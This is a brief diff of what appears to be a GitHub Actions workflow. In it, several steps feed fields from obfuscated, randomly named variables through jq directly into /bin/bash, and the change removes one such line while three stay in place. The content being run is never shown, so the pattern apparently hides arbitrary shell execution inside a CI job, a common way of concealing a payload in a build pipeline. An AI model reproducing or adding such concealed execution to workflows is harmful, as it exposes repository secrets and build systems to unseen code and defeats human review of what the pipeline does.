@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$d894" | jq -r .gst6 | /bin/bash
           echo $ulx1 | jq -r .w9 | /bin/bash
           printf '%s' "$eygp814" | jq -r .gyx4 | /bin/bash
-          echo $d393 | jq -r .fps5 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
